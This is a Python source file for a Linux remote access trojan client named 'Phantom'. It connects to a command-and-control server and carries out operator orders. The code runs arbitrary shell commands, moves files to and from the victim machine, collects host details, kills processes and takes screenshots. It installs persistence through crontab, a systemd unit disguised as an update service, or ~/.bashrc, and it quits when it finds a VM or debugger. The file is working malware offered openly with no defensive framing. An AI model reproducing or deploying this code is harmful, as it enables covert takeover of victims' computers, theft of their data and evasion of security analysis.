#!/usr/bin/env python3
"""
Linux RAT client — connects to C2, executes modules.
"""
import os
import sys
import json
import base64
import socket
import struct
import time
import threading
import subprocess
import hashlib
import platform as plat

# ─── Embedded config (filled by builder) ─────────────────────────────────────
CONFIG_B64 = "__CONFIG_B64__"
MODULES_B64 = "__MODULES_B64__"
EVASION_B64 = "__EVASION_B64__"

_config = json.loads(base64.b64decode(CONFIG_B64))
_modules = json.loads(base64.b64decode(MODULES_B64))
_evasion = json.loads(base64.b64decode(EVASION_B64))

C2_HOST = _config["c2_host"]
C2_PORT = _config["c2_port"]
MAGIC = b"PHNT"

# ─── Wire protocol ───────────────────────────────────────────────────────────
CMD_REGISTER=0x01; CMD_HEARTBEAT=0x02
CMD_SHELL=0x10; CMD_SHELL_RESP=0x11
CMD_UPLOAD=0x20; CMD_DOWNLOAD=0x21; CMD_FILE_RESP=0x22
CMD_SCREEN=0x30; CMD_SCREEN_RESP=0x31
CMD_KEYLOG=0x40; CMD_KEYLOG_RESP=0x41
CMD_SYSINFO=0x50; CMD_SYSINFO_RESP=0x51
CMD_PROCESS=0x60; CMD_PROCESS_RESP=0x61
CMD_PERSIST=0x70; CMD_PERSIST_RESP=0x71
CMD_EXIT=0xFF

def pack_msg(cmd_type, data):
    if isinstance(data, str): data = data.encode()
    return struct.pack(">4sII", MAGIC, cmd_type, len(data)) + data

def recv_msg(sock):
    header = recv_exact(sock, 12)
    if not header: return None, None
    magic, cmd_type, data_len = struct.unpack(">4sII", header)
    if magic != MAGIC: return None, None
    data = recv_exact(sock, data_len) if data_len else b""
    return cmd_type, data

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
            if not chunk: return None
            buf += chunk
        except: return None
    return buf

# ─── Evasion ─────────────────────────────────────────────────────────────────
def is_vm():
    """Check if running in a VM on Linux."""
    try:
        with open("/sys/class/dmi/id/sys_vendor") as f:
            vendor = f.read().lower()
            if any(x in vendor for x in ["vmware", "virtualbox", "qemu", "xen", "microsoft"]):
                return True
        with open("/sys/class/dmi/id/product_name") as f:
            product = f.read().lower()
            if any(x in product for x in ["vmware", "virtualbox", "kvm", "qemu"]):
                return True
    except: pass
    return False

def is_debugged():
    """Check if traced/debugged on Linux."""
    try:
        with open(f"/proc/{os.getpid()}/status") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    pid = int(line.split(":")[1].strip())
                    return pid != 0
    except: pass
    return False

def run_evasion_checks():
    if "anti_vm" in _evasion and is_vm():
        return False
    if "anti_debug" in _evasion and is_debugged():
        return False
    return True

# ─── Handlers ────────────────────────────────────────────────────────────────
def handle_shell(cmd_data):
    cmd = cmd_data.decode("utf-8", "replace")
    try:
        p = subprocess.run(["/bin/bash", "-c", cmd],
            capture_output=True, timeout=60)
        return p.stdout + p.stderr
    except Exception as e:
        return str(e).encode()

def handle_download(path_data):
    path = path_data.decode("utf-8", "replace")
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception as e:
        return str(e).encode()

def handle_upload(data):
    if len(data) < 4: return b"error"
    path_len = struct.unpack(">I", data[:4])[0]
    path = data[4:4+path_len].decode("utf-8", "replace")
    content = data[4+path_len:]
    try:
        with open(path, "wb") as f:
            f.write(content)
        return b"ok"
    except Exception as e:
        return str(e).encode()

def handle_sysinfo(data):
    info = {
        "hostname": socket.gethostname(),
        "os": f"{plat.system()} {plat.release()}",
        "arch": plat.machine(),
        "user": os.environ.get("USER", os.environ.get("LOGNAME", "unknown")),
        "pid": os.getpid(),
        "python": sys.version.split()[0],
    }
    try: info["ip"] = socket.gethostbyname(socket.gethostname())
    except: pass
    return json.dumps(info).encode()

def handle_process(data):
    cmd = data.decode("utf-8", "replace")
    if cmd.startswith("list"):
        try:
            out = subprocess.check_output(["ps", "aux"], text=True)
            return out.encode()
        except Exception as e:
            return str(e).encode()
    elif cmd.startswith("kill "):
        pid = int(cmd[5:])
        try:
            os.kill(pid, 9)
            return b"ok"
        except Exception as e:
            return str(e).encode()
    return b"unknown"

def handle_persist(data):
    method = data.decode("utf-8", "replace")
    script_path = os.path.abspath(__file__)
    try:
        if method == "crontab":
            # Add cron job for persistence
            entry = f"*/5 * * * * {sys.executable} {script_path}\n"
            # Read existing crontab
            try:
                existing = subprocess.check_output(["crontab", "-l"], text=True,
                    stderr=subprocess.DEVNULL)
            except:
                existing = ""
            # Append our entry
            new_crontab = existing + entry
            subprocess.run(["crontab", "-"], input=new_crontab, text=True)
            return b"ok: crontab installed"
        elif method == "systemd":
            service = f"""[Unit]
Description=Phantom Update
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
            service_path = f"/etc/systemd/system/phantom-update.service"
            try:
                with open(service_path, "w") as f:
                    f.write(service)
                subprocess.run(["systemctl", "daemon-reload"])
                subprocess.run(["systemctl", "enable", "phantom-update"])
                subprocess.run(["systemctl", "start", "phantom-update"])
                return b"ok: systemd service installed"
            except PermissionError:
                return b"error: needs root"
        elif method == "bashrc":
            rc_path = os.path.expanduser("~/.bashrc")
            entry = f"\n# Phantom\n{sys.executable} {script_path} &\n"
            with open(rc_path, "a") as f:
                f.write(entry)
            return b"ok: bashrc installed"
    except Exception as e:
        return str(e).encode()

def handle_screen(data):
    try:
        # Try to use scrot or import (ImageMagick) for screen capture
        import tempfile
        tmp = tempfile.mktemp(suffix=".jpg")
        # Try import (ImageMagick) first
        result = subprocess.run(["import", "-window", "root", tmp],
            capture_output=True, timeout=5)
        if result.returncode != 0:
            # Try scrot
            result = subprocess.run(["scrot", tmp], capture_output=True, timeout=5)
        if result.returncode == 0 and os.path.exists(tmp):
            with open(tmp, "rb") as f:
                data = f.read()
            os.unlink(tmp)
            return data
        return b"error: no screen capture tool available (install scrot or imagemagick)"
    except Exception as e:
        return str(e).encode()

# ─── Main ────────────────────────────────────────────────────────────────────
def main():
    if not run_evasion_checks():
        sys.exit(0)

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((C2_HOST, C2_PORT))

            reg = json.dumps({
                "hostname": socket.gethostname(),
                "os": f"{plat.system()} {plat.release()}",
                "user": os.environ.get("USER", "unknown"),
                "arch": plat.machine(),
                "pid": os.getpid(),
                "seed": "absolutespy",
            }).encode()
            sock.sendall(pack_msg(CMD_REGISTER, reg))

            while True:
                cmd_type, data = recv_msg(sock)
                if cmd_type is None:
                    break

                resp = b""
                if cmd_type == CMD_SHELL:
                    resp = handle_shell(data)
                    sock.sendall(pack_msg(CMD_SHELL_RESP, resp))
                elif cmd_type == CMD_DOWNLOAD:
                    resp = handle_download(data)
                    sock.sendall(pack_msg(CMD_FILE_RESP, resp))
                elif cmd_type == CMD_UPLOAD:
                    resp = handle_upload(data)
                    sock.sendall(pack_msg(CMD_FILE_RESP, resp))
                elif cmd_type == CMD_SYSINFO:
                    resp = handle_sysinfo(data)
                    sock.sendall(pack_msg(CMD_SYSINFO_RESP, resp))
                elif cmd_type == CMD_PROCESS:
                    resp = handle_process(data)
                    sock.sendall(pack_msg(CMD_PROCESS_RESP, resp))
                elif cmd_type == CMD_PERSIST:
                    resp = handle_persist(data)
                    sock.sendall(pack_msg(CMD_PERSIST_RESP, resp))
                elif cmd_type == CMD_SCREEN:
                    resp = handle_screen(data)
                    sock.sendall(pack_msg(CMD_SCREEN_RESP, resp))
                elif cmd_type == CMD_EXIT:
                    break

            sock.close()
        except (ConnectionError, socket.timeout, OSError):
            pass
        except Exception:
            pass
        time.sleep(5)

if __name__ == "__main__":
    main()
